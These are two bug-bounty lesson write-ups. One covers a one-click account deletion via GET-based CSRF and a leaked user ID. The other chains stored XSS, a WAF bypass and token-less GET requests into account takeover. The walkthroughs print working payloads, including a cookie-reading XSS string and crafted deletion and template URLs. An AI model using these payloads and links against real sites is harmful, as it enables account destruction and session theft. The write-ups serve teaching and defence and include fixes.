title: One-Click Account Deletion: How a Direct Link Can Instantly Delete an Authenticated User’s Account
summary_en: An attacker can instantly delete a user's account by tricking them into clicking a single link, due to a lack of confirmation steps and the leakage of a required user identifier.

lesson.cause: The application performs a highly sensitive action—account deletion—using a simple HTTP GET request (a standard way to ask a server for data) without any Cross-Site Request Forgery (CSRF) protection. CSRF protection is a security measure that ensures a request was intentionally sent by the user. Furthermore, the application fails to require a confirmation step (like a 'Yes/No' prompt) before finalizing the deletion. Finally, the secret identifier needed to trigger the deletion, called 'pivot_uid', was leaked in an unrelated booking response under a different name, 'business_uid', making it discoverable by attackers.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher explored the target application while using Burp Suite, a tool that intercepts and records all communication between the browser and the server.
2. They identified a specific endpoint (a specific web address used for a function) responsible for closing accounts.
DISCOVERY
3. The researcher noticed the account closure URL required a specific piece of data called a 'pivot_uid' (a unique identifier for a user).
4. To find how an attacker might get this ID, they searched their recorded traffic history for that specific value.
5. They discovered the exact same ID was being sent back by the server in a completely different part of the site related to bookings, labeled as 'business_uid'.
EXPLOITATION
6. The researcher combined the account closure address with the discovered ID to create a malicious link.
7. The final payload (the specific code or link used to exploit a bug) looked like this:
https://www.test.com/account/close?frontage_iframe=true&pivot_uid=<business_uid>
8. Why: The '?' starts the list of parameters (extra instructions for the server), 'frontage_iframe=true' likely tells the site how to display the page, and 'pivot_uid' tells the site exactly which account to delete.
9. The researcher logged into a test account (authentication) to simulate a real victim.
10. They pasted the crafted link into the browser while logged in.
IMPACT
11. The application immediately processed the request and deleted the account without asking for a password or a confirmation click.
12. This proves that any attacker who can find a user's 'business_uid' can trick them into deleting their own account by sending them that link.
lesson.example: Imagine a website called 'photo-share.example.com'. To delete a photo, the site uses a link like: https://photo-share.example.com/delete?photo_id=999. If a user is logged in and clicks that link, the photo is gone instantly. An attacker finds that the 'photo_id' is visible to everyone who looks at the photo's public page. The attacker then sends an email to the owner of photo #1000 saying 'Check out this cool site!' but hides the link 'https://photo-share.example.com/delete?photo_id=1000' behind the text. When the owner clicks it, their photo is deleted because the website didn't check if the owner actually clicked a 'Delete' button on the real site or use a CSRF token (a secret, one-time code) to verify the request.
lesson.takeaway: Always look for sensitive actions (delete, change password, update email) that are triggered by simple links (GET requests). If you find one, check if there is a 'CSRF token'—a long, random string in the URL or headers that changes every time. If that token is missing and there is no confirmation 'Are you sure?' button, the site is likely vulnerable. Also, always search your traffic history for 'IDs' or 'UIDs'; sometimes a secret ID required for a high-privilege action is accidentally leaked in a low-privilege response elsewhere in the app. A common mistake is assuming that because an ID looks random, an attacker can't find it.
lesson.fix:
To fix this, the developers must first change the account closure process to use a POST request instead of a GET request, as GET requests should never be used for actions that change data. Second, they must implement a CSRF token, which is a unique, unpredictable value generated by the server and validated before the deletion occurs. Finally, a mandatory confirmation step should be added where the user must click a button or re-enter their password. 

Example of a safer approach (Conceptual):
// Instead of a link, use a form with a hidden token
<form action='/account/close' method='POST'>
  <input type='hidden' name='csrf_token' value='a7b8c9d0e1f2'>
  <button type='submit'>Confirm Account Deletion</button>
</form>

title: From WAF Bypass to Account Takeover: Chaining Logic Flaws & CSRF in Stock Photo Platform
summary_en: Missing CSRF tokens and an unescaped XSS payload were chained with a WAF‑bypass to force‑apply a malicious template and hijack a user’s account with a single click.

lesson.cause: The application only validated a CSRF token on POST requests, allowing a GET request to create a template without authentication. The template‑creation endpoint did not encode user‑supplied data, so the injected XSS payload was stored unchanged inside an <input> attribute. The WAF blocked the payload on the image‑title endpoint but not on the template endpoint, creating a bypass. Finally, the apply‑template endpoint accepted the template ID and image ID via GET parameters and also omitted CSRF validation, enabling an attacker to force the XSS payload onto any victim’s image.
lesson.walkthrough:
RECON
Step 1: The researcher opened a public product page to discover the numeric image ID.
URL: https://vulnerable.com/stock-images/photos/344854051
Why: The URL contains the image ID (a number) which is later needed to target the victim’s image (URL is the address you type in a browser). 

DISCOVERY
Step 2: The researcher tried to inject an XSS payload into the image‑title field.
Payload: DrakenKun"onfocus="prompt(document.cookie)"autofocus="
Why: The payload places a <script>‑like event (onfocus) inside an HTML attribute; when the browser focuses the input, it runs prompt(document.cookie) (shows the session cookie). 
Step 3: The request was blocked by CloudFront WAF, so the researcher looked for another endpoint that accepted the same parameter.
Why: WAF (Web Application Firewall) inspects traffic and can block known malicious patterns. 
Step 4: The researcher discovered the template‑creation endpoint https://www.vulnerable.com/index.php?page=clip_templates2&what=image.
Why: This endpoint is used to create reusable image templates (a page that the app provides). 
Step 5: The researcher sent a POST request with the XSS payload in the "name" field.
POST /index.php?page=clip_templates2&what=image&command=new HTTP/2

Why: The POST includes the XSS payload URL‑encoded in the "name" parameter; the server responded 200 OK and created a template (ID 1655438). 
Step 6: The researcher verified that the same request works without the CSRF token if it is sent as a GET request.
GET https://www.vulnerable.com/index.php?page=clip_templates2&what=image&command=new&submit_what=Save&original_source=-1&contains_alpha_matte=-1&seamless_looping=-1&controller_pattern_ref=fc0&template_name=HACKED&video_standard=199&name=DrakenKun%22onfocus%3D%22prompt(document.cookie)%22autofocus%3D%22&description=&media_source=&media_created_at_int_yyyy=-1&media_created_at_int_mm=-1&media_created_at_int_dd=-1&location_city=&location_country=&copyright=&pricing_logic=&single_use_license=f&price=&pricing_manual1image=&pricing_manual2image=&pricing_manual3image=&free_clip=-1&keywords=&tagskeywords=&notes_for_you=&curator_note=
Why: Converting to GET bypasses the token check (the server only validates the token on POST), demonstrating a CSRF token omission. 

EXPLOITATION
Step 7: The researcher opened the "My Uploads" page and clicked the "Apply Image Template" action.
Why: This UI triggers a backend call that applies a stored template to a chosen image. 
Step 8: The researcher captured the POST request that applies the template.
POST /index.php?page=my_uploads_apply_template&pf_fullscreen=1&idactionsel=apptemimg&formsub=1 HTTP/2
Host: www.vulnerable.com
Cookie: <cookies>

Te: trailers template=1655438&token=ded00ee25b691c1ac22d5fd3c9731a784f27f4b63aeadd5db2527a855330680a&itemscomma=344854051&form_pattern_ref=&crc32_ref=151023883&submit=Submit
Why: "template=1655438" tells the server which template to use; "itemscomma=344854051" tells it which image to affect. The token is a CSRF protection that is only checked for POST. 
Step 9: The researcher removed the token and changed the request to GET.
GET https://www.vulnerable.com/index.php?page=my_uploads_apply_template&pf_fullscreen=1&idactionsel=apptemimg&formsub=1&template=1655438&itemscomma=344854051&form_pattern_ref=&crc32_ref=151023883&submit=Submit
Why: The server accepted the GET request without a token, so an attacker can force any victim’s image to use the malicious template (CSRF via method confusion). 

IMPACT
Step 10: When the victim’s browser renders the image page, the stored XSS payload executes, showing a prompt with document.cookie.
Why: The payload was stored inside an <input> attribute; when the page loads and the input receives focus, the JavaScript runs, leaking the session cookie. 
Step 11: The attacker can use the stolen cookie to hijack the victim’s account (account takeover).
Why: Session cookies authenticate the user; possessing them lets the attacker act as the victim.
lesson.example:
**Fictional target:** https://target.example
**Vulnerable endpoint:** POST https://target.example/create_template
Parameters: name (template name), description, token (CSRF token).
**Bug:** The server only checks the token on POST. If the same request is sent as GET, the token is ignored.
**Exploit:**
GET https://target.example/create_template?name=Evil%22onfocus%3D%22alert('XSS')%22&description=test
Why it works: The GET request bypasses the missing token check, and the name value is stored without HTML‑encoding, so the onfocus attribute triggers when the victim’s browser focuses the input.
**Impact:** An attacker can later force the victim’s page to load the stored template, causing the alert (or cookie theft) to run.
lesson.takeaway: When hunting, always look for state‑changing actions that accept both POST and GET – a missing token on one method is a classic CSRF vector. Check if any user‑controlled fields are reflected inside HTML attributes without encoding; that often leads to stored XSS. Tools like Burp Suite’s scanner or OWASP ZAP can highlight missing anti‑CSRF tokens and unsafe output encoding. Variants include token validation only on AJAX calls or only on form submissions. A common beginner mistake is assuming that a 403 from a WAF means the payload is safe; attackers can often find another endpoint that the WAF does not cover, as shown here.

excerpt: Most bug hunters skip low-severity findings like a missing CSRF token on a minor feature, assuming it isn’t worth reporting. But small logic issues become dangerous when chained together. During a recent assessment of a web application, I came across a few minor logic bugs in how user templates were created and applied. On their own, they looked fairly harmless. But by chaining two missing token checks with an unescaped input field and a WAF bypass, I was able to turn a simple link click into a single-click account takeover.
